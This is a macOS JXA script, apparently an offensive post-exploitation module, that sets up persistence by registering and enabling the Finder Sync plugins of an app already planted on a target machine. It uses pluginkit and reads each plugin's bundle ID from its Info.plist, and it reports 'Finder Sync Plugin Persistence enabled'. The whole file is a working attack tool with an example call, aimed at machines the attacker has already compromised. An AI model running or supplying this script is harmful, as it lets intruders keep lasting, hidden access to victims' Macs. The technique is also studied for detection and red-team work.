//Requires an App with the appropriate configuations already on target 
//https://objective-see.com/blog/blog_0x11.html

//example usage
//FinderSyncPlugins ('/Users/Shared/SyncTest.app')

function FinderSyncPlugins (pathToApp) {
ObjC.import('Foundation')
ObjC.import('stdlib')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

var output = ""
try{
function listDirectory(strPath) {
		var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    }
        
function addPlugintoDB(appexDir){
	var path = "/usr/bin/pluginkit"
	var args = ["-a",appexDir,"&"]
	var pipe = $.NSPipe.pipe;
	var file = pipe.fileHandleForReading;
	var task = $.NSTask.alloc.init;
	task.launchPath = path;
	task.arguments = args;
	task.standardOutput = pipe; 
	task.standardError = pipe;
	task.launch; 
	}        

function enablePlugin(finderSyncBundleID){
	var path = "/usr/bin/pluginkit"
	var args = ["-e","use","-i",finderSyncBundleID,"&"]
	var pipe = $.NSPipe.pipe;
	var file = pipe.fileHandleForReading;
	var task = $.NSTask.alloc.init;
	task.launchPath = path;
	task.arguments = args;
	task.standardOutput = pipe; 
	task.standardError = pipe;
	task.launch; 
	}  
var appexPath = pathToApp + '/Contents/PlugIns/'
var pluginsFound = listDirectory(appexPath);
	
var pluginArray = []
	for (var key in pluginsFound){
     pluginArray.push(pluginsFound[key])
    	}

	for (var key in pluginArray){
     addPlugintoDB(appexPath+pluginArray[key])
	 var pluginPlist = pathToApp + '/Contents/PlugIns/' + pluginArray[key] + '/Contents/Info.plist'
	 var contents = $.NSString.stringWithContentsOfFileEncodingError($(pluginPlist), $.NSUTF8StringEncoding, $()).js;
	 var bundleId = contents.split("CFBundleIdentifier")[1].split("</string>")[0].replace('</key>','').replace('<string>','').replace(/\s/g,'')
	 console.log(bundleId)
	 enablePlugin(bundleId)		
		}

output += "Finder Sync Plugin Persistence enabled" 

}catch(error){
       output += error.toString()
		}
	return output
}
